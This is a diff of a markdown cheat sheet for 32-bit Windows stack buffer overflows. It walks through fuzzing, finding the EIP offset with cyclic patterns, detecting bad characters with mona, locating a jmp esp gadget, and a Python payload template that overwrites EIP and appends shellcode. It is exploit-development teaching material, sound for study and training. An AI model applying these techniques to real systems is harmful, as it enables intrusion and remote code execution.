@@ -1,7 +1,7 @@
-# 32bit Stack Overflow Cheatsheet 
+# Legacyy's 32bit Stack Overflow Cheat Sheet
 These are my notes for 32bit stack overflow. It is based on windows but a lot is transferrable to linux too. :)
 
-This cheat sheet assumes that the binary doesn't have ASLR enabled, meaning you can simply ret to a `jump esp` instruction and execute shellcode from there.
+This cheat sheet assumes that the binary doesn't have ASLR enabled, meaning you can simply ret to a `jmp esp` instruction and execute shellcode from there.
 
 To keep it simple, the steps of this attack are as follows:
 
@@ -12,7 +12,7 @@ To keep it simple, the steps of this attack are as follows:
 	- [Generating all characters](#generating-all-characters)
 	- [Looking at memory](#looking-at-memory)
 3. [Locating jmp esp](#locating-jmp-esp)
-4. [Generating payload](#generating-payload)
+4. [Creating payload](#creating-payload)
 5. [Getting reverse shell](#getting-reverse-shell)
 
 ## Fuzzing
@@ -32,19 +32,20 @@ msf-pattern_create -l 1024
 
 **Using pwntools**  
 The first method here is preferred as you can also search the pattern very easily
-```py
+
+```python
 import pwn
 pattern = pwn.cyclic_gen()
 pattern.get(1024)
 ```
 OR
-```py
+```python
 import pwn
 pwn.cyclic(1024)
 ```
 
 **Using vanilla python**
-```py
+```python
 def gen_pattern(length=64):     # Generates a cyclic pattern of default length 64 characters
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     pattern = "aaaa"
@@ -68,13 +69,13 @@ def gen_pattern(length=64):     # Generates a cyclic pattern of default length 6
 ```
 
 ### Finding the Offset
-Ensure that you're using the correct pattern when you're using the offset. For example, if you're using msf to check the offset, ensure you used an msf pattern as your input to the binary.
+Ensure that you're using the correct pattern when you're checking the offset. For example, if you're using msf to check the offset, ensure you used an msf pattern as your input to the binary.
 
-If using metasploit or pwntools you can enter either the raw hex value stored in EIP or the ASCII equivilent e.g. 0x616d6261 or "amba"
+If using metasploit or pwntools you can enter either the raw hex value stored in EIP or the ASCII equivalent e.g. 0x616d6261 or "amba"
 
 **Using metasploit**
 ```bash
-msf-pattern_find -q ValueInEIP
+msf-pattern_offset -q ValueInEIP
 ```
 
 **Using pwntools**
@@ -118,7 +119,7 @@ This python snippet will allow you to easily generate all characters from 0x00 t
 ```py
 # Generate pattern for badchar detection.
 badchar_test = ""
-badchars = [0x00, 0x0A]	# Definite bad chars
+badchars = [0x00]	# Definite bad chars
 
 for i in range(0x00, 0xFF + 1):	# range(0x00, 0xFF) only returns up to 0xFE
 	if i not in badchars:
@@ -138,7 +139,7 @@ with open("badchars.bin", "wb") as f:
 ```
 Then inside Immunity Debugger run the following, changing the file path to where your .bin file is stored
 ```bash
-!mona compare -a esp -f c:\badchar_test.bin
+!mona compare -a esp -f "c:\badchars.bin"
 ```
 When the window pops up, status unmodified means that there are no more bad characters for you to remove.
 ### Locating jmp esp
@@ -157,12 +158,13 @@ ROPgadget --binary ./BINARYNAME
 ## Creating Payload
 The payload we will be using will be similar to the following...
 ```py
-buf_totlen = 1024
-offset_srp = 146
+buf_totlen = 4096
+offset_eip = 146
+jmp_esp = struct.pack("<I", jmp_ADDRESS)
 
 buf = b""
-buf += b"A"*(offset_srp - len(buf)) # padding
-buf += struct.pack("<I", jmp_esp)   # SRP overwrite, jmp esp
+buf += b"A"*(offset_eip - len(buf)) # padding
+buf += jmp_esp                      # EIP overwrite, jmp esp
 buf += sub_esp_10                   # Should be pointed to by ESP
 buf += shellcode_shell
 buf += b"D"*(buf_totlen - len(buf)) # Trailing padding
